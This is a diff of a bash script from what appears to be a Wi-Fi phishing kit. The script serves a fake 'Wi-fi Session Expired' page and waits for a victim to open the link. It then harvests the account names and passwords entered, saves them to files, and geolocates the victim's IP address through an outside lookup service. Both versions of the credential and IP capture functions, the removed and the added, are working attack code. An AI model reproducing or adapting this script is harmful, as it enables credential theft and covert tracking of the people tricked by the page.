@@ -634,22 +634,6 @@ banner() {
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 createpage() {
 
     default_cap1="Wi-fi Session Expired"
@@ -732,276 +716,119 @@ createpage() {
 
 }
 
-
-
 catch_cred() {
 
-    # Ensure that the output file exists; create it if it doesn't
-
-    if [[ ! -f "sites/$server/usernames.txt" ]]; then
-
-        echo -e "${YELLOW}[!] Credentials file not found. Creating a new file...${NC}"
-
-        touch "sites/$server/usernames.txt"
-
-        echo -e "${YELLOW}New file created: sites/$server/usernames.txt${NC}"
-
-        return
-
-    fi
-
-
-
-    # Extract account and password information
-
-    account=$(grep -oP '^Account:\s*\K.+' sites/$server/usernames.txt | head -n1 | xargs)
-
-    password=$(grep -oP '^Pass:\s*\K.+' sites/$server/usernames.txt | head -n1 | xargs)
-
-
-
-    # Display found credentials with enhanced formatting
-
-    if [[ -n "$account" || -n "$password" ]]; then
-
-        echo -e "${CYAN}-----------------------------------${NC}"
-
-        if [[ -n "$account" ]]; then
-
-            echo -e "\e[1;92m[*] ${YELLOW}Account:${NC} ${WHITE}$account${NC}"
-
-        fi
-
-        if [[ -n "$password" ]]; then
-
-            echo -e "\e[1;92m[*] ${YELLOW}Password:${NC} ${WHITE}$password${NC}"
-
-        fi
-
-        echo -e "${CYAN}-----------------------------------${NC}"
-
-    else
-
-        echo -e "${RED}[!] No credentials found.${NC}"
-
-    fi
-
-
-
-    # Optionally, display IP and related info if available
-
-    ip_address=$(grep -oP '^IP:\s*\K.+' sites/$server/usernames.txt | head -n1 | xargs)
-
-    if [[ -n "$ip_address" ]]; then
-
-        echo -e "${YELLOW}IP Address:${NC} ${WHITE}$ip_address${NC}"
-
-    fi
+account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
+IFS=$'\n'
+password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
+cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
+exit 1
 
 }
-
-
-
-
-
-
-
-catch_ip() {
-
-    # Ensure that the server variable is set correctly
-
-    if [[ -z "$server" ]]; then
-
-        echo -e "${RED}[!] Error: Server variable is not set.${NC}"
-
-        return
-
-    fi
-
-
-
-    ip_file="sites/$server/ip.txt"
-
-    user_agent_file="sites/$server/user-agent.txt"
-
-    saved_file="sites/$server/saved.ip.txt"
-
-
-
-    # Create the saved IP file if it doesn't exist
-
-    touch "$saved_file"
-
-
-
-    # Initialize variables
-
-    ip="No IP found or file not found"
-
-    ua="No User-Agent found or file not found"
-
-
-
-    # Extract IP and User-Agent, handle missing files
-
-    if [[ -f "$ip_file" ]]; then
-
-        ip=$(grep -a 'IP:' "$ip_file" | cut -d " " -f2 | tr -d '\r')
-
-    else
-
-        echo -e "${YELLOW}[!] IP file not found. Creating a new file...${NC}"
-
-        touch "$ip_file"
-
-    fi
-
-
-
-    if [[ -f "$user_agent_file" ]]; then
-
-        ua=$(grep 'User-Agent:' "$user_agent_file" | cut -d '"' -f2)
-
-    else
-
-        echo -e "${YELLOW}[!] User-Agent file not found. Creating a new file...${NC}"
-
-        touch "$user_agent_file"
-
-    fi
-
-
-
-    # Print IP and User-Agent
-
-    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" "$ip"
-
-    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" "$ua"
-
-    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s\e[0m\n" "$saved_file"
-
-
-
-    # Append the IP information to the saved file
-
-    if [[ -f "$ip_file" ]]; then
-
-        cat "$ip_file" >> "$saved_file"
-
-    fi
-
-
-
-    # Clean up previous log and fetch new IP lookup information
-
-    if [[ -e "iptracker.log" ]]; then
-
-        rm -f "iptracker.log"
-
-    fi
-
-
-
-    if [[ -n "$ip" && "$ip" != "No IP found or file not found" ]]; then
-
-        curl -s -L "https://www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > "iptracker.log"
-
-
-
-        # Parse and print IP lookup information
-
-        continent=$(grep -o 'Continent.*' "iptracker.log" | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
-
-        hostnameip=$(grep -o "</td></tr><tr><th>Hostname:.*" "iptracker.log" | cut -d "<" -f7 | cut -d ">" -f2)
-
-        reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" "iptracker.log" | cut -d "<" -f1)
-
-        country=$(grep -o 'Country:.*' "iptracker.log" | cut -d ">" -f3 | cut -d "&" -f1)
-
-        state=$(grep -o "tracking lessimpt.*" "iptracker.log" | cut -d "<" -f1 | cut -d ">" -f2)
-
-        city=$(grep -o "City Location:.*" "iptracker.log" | cut -d "<" -f3 | cut -d ">" -f2)
-
-        isp=$(grep -o "ISP:.*" "iptracker.log" | cut -d "<" -f3 | cut -d ">" -f2)
-
-        as_number=$(grep -o "AS Number:.*" "iptracker.log" | cut -d "<" -f3 | cut -d ">" -f2)
-
-        ip_speed=$(grep -o "IP Address Speed:.*" "iptracker.log" | cut -d "<" -f3 | cut -d ">" -f2)
-
-        ip_currency=$(grep -o "IP Currency:.*" "iptracker.log" | cut -d "<" -f3 | cut -d ">" -f2)
-
-
-
-        # Print the IP lookup details
-
-        [[ -n "$continent" ]] && printf "\e[1;92m[*] IP Continent:\e[0m\e[1;77m %s\e[0m\n" "$continent"
-
-        [[ -n "$hostnameip" ]] && printf "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" "$hostnameip"
-
-        [[ -n "$reverse_dns" ]] && printf "\e[1;92m[*] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" "$reverse_dns"
-
-        [[ -n "$country" ]] && printf "\e[1;92m[*] IP Country:\e[0m\e[1;77m %s\e[0m\n" "$country"
-
-        [[ -n "$state" ]] && printf "\e[1;92m[*] State:\e[0m\e[1;77m %s\e[0m\n" "$state"
-
-        [[ -n "$city" ]] && printf "\e[1;92m[*] City Location:\e[0m\e[1;77m %s\e[0m\n" "$city"
-
-        [[ -n "$isp" ]] && printf "\e[1;92m[*] ISP:\e[0m\e[1;77m %s\e[0m\n" "$isp"
-
-        [[ -n "$as_number" ]] && printf "\e[1;92m[*] AS Number:\e[0m\e[1;77m %s\e[0m\n" "$as_number"
-
-        [[ -n "$ip_speed" ]] && printf "\e[1;92m[*] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" "$ip_speed"
-
-        [[ -n "$ip_currency" ]] && printf "\e[1;92m[*] IP Currency:\e[0m\e[1;77m %s\e[0m\n" "$ip_currency"
-
-
-
-        # Clean up
-
-        rm -f "iptracker.log"
-
-    else
-
-        echo -e "${YELLOW}[!] No valid IP found for lookup.${NC}"
-
-    fi
-
-}
-
-
-
-
-
-
-
-
-
-
 
 getcredentials() {
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting for credentials ...\e[0m\n"
+while [ true ]; do
 
-    printf "\n\e[1;92m[\e[0m*\e[1;92m] Getting credentials...\e[0m\n"
 
-    if [[ -e sites/$server/ip.txt ]]; then
+if [[ -e "sites/$server/usernames.txt" ]]; then
+printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
+catch_cred
 
-        printf "\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
+fi
+sleep 1
+done 
 
-        catch_ip
-
-    fi
-
-    if [[ -e sites/$server/usernames.txt ]]; then
-
-        printf "\e[1;92m[\e[0m*\e[1;92m] Credentials Found!\n"
-
-        catch_cred
-
-    fi
 
 }
 
+catch_ip() {
+touch sites/$server/saved.usernames.txt
+ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
+IFS=$'\n'
+ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
+cat sites/$server/ip.txt >> sites/$server/saved.ip.txt
 
 
+if [[ -e iptracker.log ]]; then
+rm -rf iptracker.log
+fi
+
+IFS='\n'
+iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
+IFS=$'\n'
+continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
+printf "\n"
+hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
+if [[ $hostnameip != "" ]]; then
+printf "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
+fi
+##
+
+reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
+if [[ $reverse_dns != "" ]]; then
+printf "\e[1;92m[*] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
+fi
+##
+
+
+if [[ $continent != "" ]]; then
+printf "\e[1;92m[*] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
+fi
+##
+
+country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
+if [[ $country != "" ]]; then
+printf "\e[1;92m[*] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
+fi
+##
+
+state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
+if [[ $state != "" ]]; then
+printf "\e[1;92m[*] State:\e[0m\e[1;77m %s\e[0m\n" $state
+fi
+##
+city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+
+if [[ $city != "" ]]; then
+printf "\e[1;92m[*] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
+fi
+##
+
+isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+if [[ $isp != "" ]]; then
+printf "\e[1;92m[*] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
+fi
+##
+
+as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+if [[ $as_number != "" ]]; then
+printf "\e[1;92m[*] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
+fi
+##
+
+ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+if [[ $ip_speed != "" ]]; then
+printf "\e[1;92m[*] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
+fi
+##
+ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+
+if [[ $ip_currency != "" ]]; then
+printf "\e[1;92m[*] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
+fi
+##
+printf "\n"
+rm -rf iptracker.log
+
+getcredentials
+}
 
 
 start() {
@@ -1062,7 +889,7 @@ start_localhostrun() {
 
             rm -rf sites/$server/ip.txt
 
-        fi
+         fi
 
         if [[ -e sites/$server/usernames.txt ]]; then
 
@@ -1140,30 +967,6 @@ start_localhostrun() {
 
 }
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 checkfound() {
 
     printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting victim open the link ...\e[0m\n"
@@ -1205,4 +1008,3 @@ rm -rf .nojekyll
 banner
 
 menu
-
